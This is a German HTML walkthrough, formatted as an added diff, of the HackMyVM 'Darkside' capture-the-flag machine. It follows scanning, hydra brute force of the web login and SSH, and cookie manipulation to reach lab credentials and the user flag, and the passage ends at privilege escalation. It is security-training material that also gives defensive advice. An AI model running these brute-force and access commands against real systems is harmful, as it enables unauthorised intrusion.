@@ -1,0 +1,811 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Darkside - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header angepasst -->
+    <div class="header-bg">
+        <h1>Darkside - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe Rot wird durch CSS gesteuert -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmente für Rot -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">CyberChef</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis gemäß Struktur -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Pentest startet mit einem `arp-scan -l`, um aktive Hosts im lokalen Netzwerk zu entdecken.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Darkside" wird mit der IP `192.168.2.104` und der MAC `08:00:27:87:23:a3` (Oracle VirtualBox) identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel-IP `192.168.2.104` für die nächsten Scans verwenden.<br><strong>Empfehlung (Admin):</strong> Netzwerküberwachung (z.B. `arpwatch`) und Segmentierung können solche Scans erschweren oder erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/jolokia-exploitation-toolkit]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.104	08:00:27:87:23:a3	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei des Angreifer-Systems wird (vermutlich mit `vi` oder einem anderen Editor) bearbeitet, um der IP `192.168.2.104` den Hostnamen `darkside.hmv` zuzuweisen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erleichtert die Adressierung des Ziels in den folgenden Schritten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hostnamen `darkside.hmv` konsequent verwenden.<br><strong>Empfehlung (Admin):</strong> Lokale Angreifer-Konfiguration, keine direkte Auswirkung auf das Ziel.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+192.168.2.104   darkside.hmv
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sV -A -T5 -p-`) wird durchgeführt, um offene Ports und Dienste zu finden, gefolgt von einer gefilterten Ausgabe (`grep open`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden zwei offene Ports identifiziert:
+                *   **22/tcp (SSH):** OpenSSH 8.4p1 (Debian).
+                *   **80/tcp (HTTP):** Apache httpd 2.4.56 (Debian).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Angriffsfläche beschränkt sich auf SSH und den Webserver. Beide sollten genauer untersucht werden.<br><strong>Empfehlung (Admin):</strong> Nur notwendige Ports offen lassen. Dienste aktuell halten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.104 -p- | grep open</span></div>
+                    <pre>
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Derselbe Nmap-Scan wird erneut ausgeführt, diesmal mit vollständiger Ausgabe.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die offenen Ports und Versionen. Liefert zusätzliche Informationen:
+                *   SSH-Hostkeys.
+                *   HTTP-Titel "The DarkSide".
+                *   HTTP-Cookie `PHPSESSID` wird ohne das `HttpOnly`-Flag gesetzt.
+                *   OS-Erkennung deutet auf Linux (Kernel 4.x/5.x).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das fehlende `HttpOnly`-Flag ist ein potenzieller Angriffsvektor für Cross-Site Scripting (XSS), um das Session-Cookie zu stehlen. Der Titel "The DarkSide" liefert thematischen Kontext. Konzentrieren Sie sich auf die Webanwendung.<br><strong>Empfehlung (Admin):</strong> Setzen Sie das `HttpOnly`-Flag für alle Session-Cookies, um das Diebstahlrisiko durch XSS zu mindern. Halten Sie SSH und Apache aktuell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools/jolokia-exploitation-toolkit]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.104 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-18 00:42 CET
+Nmap scan report for darkside (192.168.2.104)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+| ssh-hostkey:
+|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)
+|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)
+|_  256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.56 (Debian)
+|_http-title: The DarkSide
+MAC Address: 08:00:27:87:23:A3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms darkside (192.168.2.104)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.67 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Webserver-Scanner `nikto` wird auf `darkside.hmv` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt die Apache-Version, die fehlenden Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`) und das fehlende `HttpOnly`-Flag beim `PHPSESSID`-Cookie. Ein wichtiger neuer Fund ist das Verzeichnis `/backup/`, für das Directory Indexing aktiviert ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie sofort den Inhalt des `/backup/`-Verzeichnisses. Das fehlende `HttpOnly`-Flag bleibt ein potenzieller Vektor.<br><strong>Empfehlung (Admin):</strong> Fügen Sie die fehlenden Sicherheitsheader hinzu. Setzen Sie das `HttpOnly`-Flag für Cookies. Deaktivieren Sie Directory Indexing, insbesondere für Backup-Verzeichnisse. Sichern Sie Backup-Verzeichnisse angemessen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h darkside.hmv</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.104
++ Target Hostname:    darkside.hmv
++ Target Port:        80
++ Start Time:         2023-11-18 00:43:38 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.56 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /backup/: Directory indexing found.
++ /backup/: This might be interesting.
++ 7962 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2023-11-18 00:43:53 (GMT1) (15 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf `http://darkside.hmv` verwendet, mit einer großen Wortliste (`directory-list-2.3-big.txt`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet die Hauptseite `index.php` und bestätigt das `/backup/`-Verzeichnis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erkunden Sie das `/backup/`-Verzeichnis.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zu Backup-Verzeichnissen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://darkside.hmv" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+http://darkside.hmv/index.php            (Status: 200) [Size: 683]
+http://darkside.hmv/backup               (Status: 301) [Size: 313] [--> http://darkside.hmv/backup/]
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `dirb` wird zur Verzeichnissuche verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut das `/backup/`-Verzeichnis.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erkunden Sie `/backup/`.<br><strong>Empfehlung (Admin):</strong> Sichern Sie `/backup/` ab.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://darkside.hmv</span></div>
+                     <pre>
+[...]
+==> DIRECTORY: http://darkside.hmv/backup/
+[...]
+                     </pre> <!-- Gekürzte Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Manuelle Untersuchung des `/backup/`-Verzeichnisses findet eine Datei `vote.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `vote.txt` enthält eine Liste von Benutzernamen mit Ja/Nein-Stimmen und den Hinweis "good luck kevin". Dies deutet darauf hin, dass `kevin` ein gültiger Benutzername ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahieren Sie die Benutzernamen aus `vote.txt` für Brute-Force-Angriffe. Konzentrieren Sie sich zunächst auf den Benutzer `kevin`.<br><strong>Empfehlung (Admin):</strong> Legen Sie niemals Benutzerlisten oder andere sensible Informationen in öffentlich zugänglichen Backup-Verzeichnissen ab.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Manuelle Untersuchung von http://darkside.hmv/backup/
+# Inhalt von http://darkside.hmv/backup/vote.txt :
+rijaba: Yes
+xerosec: Yes
+sml: No
+cromiphi: No
+gatogamer: No
+chema: Yes
+talleyrand: No
+d3b0o: Yes
+
+Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um nach Parametern für `index.php` zu suchen (`FUZZ=id`), wobei Antworten mit Status 404 oder einer Charaktergröße von 683 ignoriert werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan findet keine gültigen Parameter (oder alle Antworten wurden herausgefiltert). Es scheint keine einfache Parameter-basierte Schwachstelle (wie LFI/RFI) auf der Startseite zu geben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Login-Funktionalität der `index.php` oder andere potenzielle Schwachstellen der Webanwendung.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion, da keine Schwachstelle gefunden wurde.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://darkside.hmv/index.php?FUZZ=id --hc 404 --hh 683</span></div>
+                      <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://darkside.hmv/index.php?FUZZ=id
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+
+Total time: [Zeit]
+Processed Requests: 220560
+Filtered Requests: 220560
+Requests/sec.: [Rate]
+                      </pre> <!-- Keine Ergebnisse gefunden -->
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Aus der Datei `vote.txt` werden die Benutzernamen extrahiert (`awk '{print $1}' | tr -d ":"`) und in die Datei `user.txt` geschrieben. Es wird ein Hydra-Befehl notiert (aber nicht ausgeführt), um alle Benutzer aus `user.txt` gegen das Login-Formular der `index.php` zu testen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `user.txt` wird korrekt für weitere Angriffe vorbereitet. Der notierte Hydra-Befehl zeigt das korrekte Format für einen Web-Formular-Brute-Force-Angriff.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen gezielten Hydra-Angriff auf den Benutzer `kevin` durch, da dieser im Hinweis erwähnt wurde.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Schutzmechanismen gegen Brute-Force-Angriffe auf Login-Formulare (z.B. Captchas, Account Lockouts, Fail2ban).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat vote.txt | awk '{print $1}' | tr -d ":" > user.txt</span></div>
+                     <pre></pre>
+                     <pre>
+# Notierter Hydra-Befehl (nicht ausgeführt):
+# hydra -L user.txt -P /usr/share/wordlists/rockyou.txt darkside.hmv http-post-form "/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
+                     </pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ein gezielter `hydra`-Angriff wird auf das Web-Login-Formular (`http-post-form`) der `index.php` für den Benutzer `kevin` gestartet, unter Verwendung der `rockyou.txt`-Wortliste.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hydra ist erfolgreich und findet das Web-Login-Passwort `<span class="password">iloveyou</span>` für den Benutzer `kevin`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich mit `kevin`:`iloveyou` auf der Webseite `http://darkside.hmv/index.php` an und untersuchen Sie den Bereich nach dem Login.<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke Passwörter. Implementieren Sie Brute-Force-Schutz.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l kevin -P /usr/share/wordlists/rockyou.txt darkside.hmv http-post-form "/index.php:user=kevin&pass=^PASS^:Username or password invalid"</span></div>
+                      <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-18 01:18:51
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344480 login tries (l:1/p:14344480), ~896530 tries per task
+[DATA] attacking http-post-form://darkside.hmv:80/index.php:user=kevin&pass=^PASS^:Username or password invalid
+[80][http-post-form] host: darkside.hmv   login: kevin   password: <span class="password">iloveyou</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at [Zeit nicht gezeigt]
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Web-Login als `kevin` wird eine Seite mit dem Pfad `/betsvjpaodnmrczulwqi.onion/` angezeigt. Diese enthält einen Hinweis ("Remember to go to:") und einen Base58/Base64-kodierten String.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein weiterer Schritt im Rätsel. Der String muss dekodiert werden, um den nächsten Hinweis oder Pfad zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein Tool wie CyberChef, um den String `kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC` zuerst mit Base58 und dann mit Base64 zu dekodieren.<br><strong>Empfehlung (Admin):</strong> Vermeiden Sie Security through Obscurity. Versteckte Pfade und einfache Kodierungen bieten keine echte Sicherheit.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Nach Web-Login als kevin:iloveyou wird folgende Seite angezeigt:
+# http://darkside.hmv/betsvjpaodnmrczulwqi.onion/
+
+Hello Kevin
+Remember to go to:
+kgr6F1pR4VLAZoFnvRSX1t4GAEqbbph6yYs3ZJw1tXjxZyWCC
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Base58/Base64-String wird mit CyberChef dekodiert (Rezept: From Base58, dann From Base64). Das Ergebnis ist `sfqekmgncutjhbypvxda.onion`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der nächste Pfad auf dem Webserver, der besucht werden muss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie die URL `http://darkside.hmv/sfqekmgncutjhbypvxda.onion/` auf.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung zu Security through Obscurity.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Dekodierung mit CyberChef:
+# https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',false)From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=a2dyNkYxcFI0VkxBWm9GbnZSU1gxdDRHQUVxYmJwaDZ5WXMzWkp3MXRYanhaeVdDQw
+
+# Ergebnis:
+sfqekmgncutjhbypvxda.onion
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Seite `http://darkside.hmv/sfqekmgncutjhbypvxda.onion/` wird aufgerufen. Sie enthält die Frage "Which Side Are You On?" und ein JavaScript-Snippet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das JavaScript prüft, ob ein Cookie namens `side` den Wert `darkside` hat. Wenn ja, leitet es zu einer Datei namens `hwvhysntovtanj.password` weiter. Anmerkung: Im JavaScript steht `sideCookie[2] = 'darkside'`, was eine Zuweisung ist. Höchstwahrscheinlich sollte es ein Vergleich `==` oder `===` sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Manipulieren Sie Ihre Browser-Cookies (z.B. mit Entwicklertools oder Burp Suite). Setzen Sie ein Cookie `side=darkside` für die Domain `darkside.hmv`. Laden Sie die Seite `/sfqekmgncutjhbypvxda.onion/` neu. Sie sollten dann zur Datei `hwvhysntovtanj.password` weitergeleitet werden.<br><strong>Empfehlung (Admin):</strong> Führen Sie sicherheitsrelevante Prüfungen serverseitig durch, nicht nur clientseitig im JavaScript. Korrigieren Sie den Zuweisungsfehler im JavaScript.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <pre>
+# Besuch von http://darkside.hmv/sfqekmgncutjhbypvxda.onion/
+# Angezeigter Text:
+Which Side Are You On?
+
+# Quellcode der Seite enthält:
+<script>
+    var sideCookie = document.cookie.match(/(^| )side=([^;]+)/);
+    // ACHTUNG: Wahrscheinlich Tippfehler im Original, sollte == oder === sein
+    if (sideCookie && sideCookie[2] = 'darkside') {
+        window.location.href = 'hwvhysntovtanj.password';
+    }
+</script>
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nachdem das Cookie `side=darkside` gesetzt wurde, wird die Seite neu geladen, was zur Weiterleitung und zum Abruf der Datei `hwvhysntovtanj.password` führt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält die Zugangsdaten `<span class="password">kevin:ILoveCalisthenics</span>`. Dies sind höchstwahrscheinlich die SSH-Zugangsdaten für den Benutzer `kevin`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie diese Zugangsdaten, um sich per SSH als `kevin` anzumelden.<br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals Klartext-Zugangsdaten in öffentlich zugänglichen Webdateien.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Cookie manipulation: Setze Cookie "side=darkside"
+# Erneutes Laden von http://darkside.hmv/sfqekmgncutjhbypvxda.onion/
+# Weiterleitung zu http://darkside.hmv/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password
+
+# Inhalt der Datei hwvhysntovtanj.password:
+kevin:<span class="password">ILoveCalisthenics</span>
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein `hydra`-Angriff wird auf den SSH-Dienst (Port 22) für den Benutzer `kevin` gestartet, um das Passwort zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hydra findet sehr schnell das Passwort `<span class="password">ILoveCalisthenics</span>`, was die zuvor gefundene Information bestätigt. Dieser Schritt wäre nicht notwendig gewesen, dient aber als Verifizierung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der SSH-Zugang ist nun bestätigt. Fahren Sie mit dem SSH-Login fort.<br><strong>Empfehlung (Admin):</strong> Erzwingen Sie starke SSH-Passwörter und implementieren Sie Brute-Force-Schutz (z.B. `fail2ban`).</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l kevin -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.104:22 -t 64</span></div>
+                      <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-18 01:25:05
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344481 login tries (l:1/p:14344481), ~224133 tries per task
+[DATA] attacking ssh://192.168.2.104:22/
+[22][ssh] host: 192.168.2.104   login: kevin   password: <span class="password">ILoveCalisthenics</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra finished at [Zeit nicht gezeigt]
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit den gefundenen Zugangsdaten (`kevin`:`ILoveCalisthenics`) wird eine SSH-Verbindung zum Zielsystem aufgebaut.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich! Initial Access als Benutzer `kevin` wurde erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Post-Exploitation-Enumeration als `kevin`. Suchen Sie nach Privilegieneskalationsvektoren (`sudo -l`, SUID, Cronjobs etc.) und lesen Sie die User-Flag.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das kompromittierte Passwort. Analysieren Sie den komplexen Weg, der zum Fund der SSH-Zugangsdaten führte (Web-Login -> Onion-Seiten -> Passwortdatei) und sichern Sie jeden Schritt ab.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh kevin@darkside.hmv</span></div>
+                     <pre>
+The authenticity of host 'darkside.hmv (192.168.2.104)' can't be established.
+ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWQ//VhyZvK4KN6rmk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'darkside.hmv' (ED25519) to the list of known hosts.
+kevin@darkside.hmv's password:
+Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
+                     </pre>
+                      <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command"></span></div>
+                  </div>
+              </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `kevin` wird der Inhalt des Home-Verzeichnisses aufgelistet und die Datei `user.txt` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wird gefunden und lautet `<span class="password">UnbelievableHumble</span>`. Die Bash-History ist nach `/dev/null` gelinkt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Fahren Sie mit der Suche nach Root-Privilegien fort.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die User-Flag mit restriktiven Berechtigungen. Das Umleiten der History erschwert die Forensik.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">ls -la</span></div>
+                      <pre>
+total 32
+drwxr-xr-x 3 kevin kevin 4096 Oct 30 08:41 .
+drwxr-xr-x 4 root  root  4096 Oct 15 13:19 ..
+lrwxrwxrwx 1 kevin kevin    9 Oct 30 08:41 .bash_history -> /dev/null
+-rw-r--r-- 1 kevin kevin  220 Oct 15 12:54 .bash_logout
+-rw-r--r-- 1 kevin kevin 3526 Oct 15 12:54 .bashrc
+-rw-r--r-- 1 kevin kevin  113 Oct 15 13:37 .history
+drwxr-xr-x 3 kevin kevin 4096 Oct 15 13:37 .local
+-rw-r--r-- 1 kevin kevin  807 Oct 15 12:54 .profile
+-rw-r--r-- 1 kevin kevin   19 Oct 15 13:38 user.txt
+                      </pre>
+                       <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">cat user.txt</span></div>
+                       <pre><span class="password">UnbelievableHumble</span></pre>
+                     </div>
+                 </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die sudo-Berechtigungen für `kevin` werden mit `sudo -l` geprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `kevin` darf keine Befehle mit `sudo` ausführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sudo ist kein Vektor. Suchen Sie nach anderen Möglichkeiten.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration nach dem Prinzip der geringsten Rechte.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">kevin@darkside:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+[sudo] password for kevin:
+Sorry, user kevin may not run sudo on darkside.
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/home` wird aufgelistet. Eine Datei namens `.history` im Home-Verzeichnis von `kevin` wird ausgelesen.</p>
